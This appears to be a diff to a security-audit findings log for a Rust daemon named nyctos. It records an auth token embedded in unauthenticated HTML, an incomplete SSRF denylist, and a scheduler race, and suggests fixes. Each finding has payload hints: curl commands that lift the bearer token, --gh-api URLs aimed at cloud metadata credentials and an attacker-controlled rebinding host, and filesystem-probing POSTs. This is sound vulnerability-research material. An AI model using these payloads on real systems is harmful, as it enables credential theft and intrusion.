@@ -2667,3 +2667,39 @@ record_exploration_finding
   "rationale": "The `local-path` branch accepts any absolute filesystem path the operator-trusted bearer-holder names, then runs `path.exists()`, `path.is_dir()`, and `read_local_git_remote(path)` against it — the last reads `<path>/.git/config` and surfaces the `[remote \"origin\"]` url in the response body. There is no jail to the configured projects root, so a bearer holder (including a CSWSH/DNS-rebind primitive plus a leaked `?token=`) can enumerate the host filesystem (existence + dir/file disambiguation oracle on every path probed) and exfiltrate the remote URL of any git repo readable by the daemon uid — typically the operator's other private repos, their work clones, and embedded credentials in `https://user:token@host/...` remotes. Static pass missed because no tainted-flow sink fires: the response surfaces benign-typed `String` fields. The bug is a missing authorization boundary, not a sink.",
   "suggested_payload_hint": "Loop POST /api/v1/projects/<id>/repos/test {\"source_kind\":\"local-path\",\"source_url_or_path\":\"/Users/<op>/secret-repo\"}; observe `on_disk_git_remote` reveal e.g. https://x-access-token:<gh-pat>@github.com/org/private."
 }
+
+---
+pass 6 (workspace=crates/nyctos focus, 2026-05-20)
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-ui/src/lib.rs",
+  "line": 79,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "GET / (SPA index.html via spa_handler_with fallback)",
+  "rationale": "inject_bootstrap unconditionally embeds the daemon's bearer auth_token into every index.html response as `<script>window.__NYCTOS_BOOTSTRAP__={\"authToken\":\"…\"};</script>` — see serde_payload at lib.rs:100-107 reading bootstrap.auth_token. The SPA fallback handler (lib.rs:130 spa_handler_with) is wired *outside* the auth_layer in nyctos/src/main.rs:1033 (`build_router(server_state).fallback(ui_fallback)` — fallback bypasses the layer applied inside build_router), so the bootstrap HTML is served without bearer enforcement. Default [ui].listen_addr is 127.0.0.1:8765 (nyctos-core/src/config.rs:261) but the same struct accepts `0.0.0.0:9999` (the test fixture at config.rs:464 proves the parser accepts wildcard bind); operators who flip listen_addr to a LAN address — or run the daemon inside a container with port mapping — expose the auth token to anyone who can reach the port. A drive-by `curl http://host:port/ | grep authToken` lifts the bearer; the attacker then has full POST /api/v1/scan, POST /api/v1/projects/.../repos/test (which is itself an OS_COMMAND vector per pass 5), and PATCH on any other authenticated route. The token is *also* persisted to state_dir.load_or_mint_auth_token (main.rs:985) so the leaked credential is long-lived: it survives daemon restarts and rotates only on explicit operator action. Static pass missed because (a) the leak surface is HTML body injection, not a typed sink the rule catalogue tracks, (b) the missing auth check is on the *fallback*, not on a registered route — graph-based reachability rules walk the Router's routes but not its fallback closure.",
+  "suggested_payload_hint": "from any LAN host while daemon listens on a routable IP: `curl -s http://<daemon-ip>:<port>/ | grep -oE '\"authToken\":\"[^\"]+\"'` → copy token → `curl -H 'Authorization: Bearer <token>' http://<daemon-ip>:<port>/api/v1/projects` to confirm authenticated access. Combine with the pass-5 git-ls-remote ext:: row for RCE under daemon uid."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos/src/cmd/pr_comment.rs",
+  "line": 366,
+  "cap": "SSRF",
+  "endpoint": "<cli:nyctos pr-comment --gh-api> (also: any future caller of validate_gh_api_url)",
+  "rationale": "validate_gh_api_url at pr_comment.rs:329 enumerates a denylist (IMDS 169.254.169.254 + cloud metadata + link-local fe80::/10 + 169.254/16) before the GitHub bearer header is attached and the URL is fetched (build_client at line 395 sets Authorization: Bearer <token>). The denylist is incomplete on three axes the static pass cannot reason about: (1) RFC1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and CGNAT (100.64.0.0/10) are NOT refused — `https://192.168.1.1/api/v3` passes validation, so under a `pull_request_target` workflow that interpolates forked-PR input into the `--gh-api` flag (the code comment at line 313 explicitly calls out this trust-boundary break), the bearer ships to internal LAN hosts and any DNS / mDNS resolver the runner can reach. (2) IPv4-mapped IPv6 like `[::ffff:169.254.169.254]` bypasses the 169.254 textual prefix check (line 371 does `host_lc.starts_with(\"169.254.\")` on the bracket-stripped form `::ffff:169.254.169.254`, which does not match). (3) The denylist is name-based (`host_lc == \"metadata.google.internal\"`) but does not refuse hostnames that *resolve* to IMDS — a DNS A record for `evil.attacker.com → 169.254.169.254` is accepted at validation time and only resolved when reqwest issues the request, after the bearer is already attached. Defence-in-depth alternative is to set reqwest's resolver to refuse private ranges OR to refuse any non-public IP after DNS resolution. Static pass missed because the URL is a typed argv value, not a tainted-flow string sink, and the denylist *looks* like a complete IMDS guard.",
+  "suggested_payload_hint": "(rfc1918) `nyctos pr-comment --report r.json --repo o/r --pr 1 --gh-api https://192.168.1.1/api/v3 --token-env GITHUB_TOKEN` → bearer hits LAN device. (mapped-v6) `--gh-api https://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/` → bearer hits IMDS on hosts whose stack accepts mapped-v6 syntax. (dns-rebinding) point `attacker.example.com` at 169.254.169.254 then pass `--gh-api https://attacker.example.com/`."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos/src/scheduler.rs",
+  "line": 165,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<scheduler:Scheduler::tick state machine>",
+  "rationale": "tick() at scheduler.rs:142 sets `entry.last_fired_minute = Some(minute);` at line 165 *before* the await on `self.trigger.trigger(...)` resolves. On the `ScanTriggerError::Backpressure` branch (line 180) the entry stays marked-fired for that minute and the dispatcher rejection is only `warn!`-logged — the scheduled scan is silently dropped, never retried. The MPSC dispatcher behind ScanTrigger (nyctos/src/main.rs:951 — `mpsc::channel::<ScanRequest>(16)`) holds a 16-deep queue; any authenticated bearer holder (including any session that lifted the token via the inject_bootstrap row above, or via the `?token=` URL-query auth) can pin the queue full by POSTing 16 long-running scans, then any cron entry whose firing minute coincides with the saturation window is permanently skipped for that minute — no retry, no surface in the response of `GET /api/v1/runs`, and the next valid fire is one full cron interval (typically a week for `0 3 * * 1`) later. For a security product whose value proposition is `you will be scanned at the configured cadence`, this is a denial-of-detection: an attacker who plants a vulnerability on a Sunday and pins the dispatcher across 03:00 Monday keeps the planted code out of the scan corpus until the next Monday. The atomic state write should move into the `Ok(run_id)` arm so a backpressured fire eligible for retry on the next tick. Static pass missed because the bug is the *ordering* of two writes around an await, a classic state-machine flaw that no taint or call-graph rule reasons about.",
+  "suggested_payload_hint": "(authenticated, repro) POST /api/v1/scan {} sixteen times against a daemon whose schedule is `*/2 * * * *`; observe that the very next cron tick logs `dispatcher saturated, skipping this fire` and the firing minute never produces a run_id even after the 16 long scans drain. Fix: move `last_fired_minute = Some(minute)` into the Ok arm at scheduler.rs:167."
+}
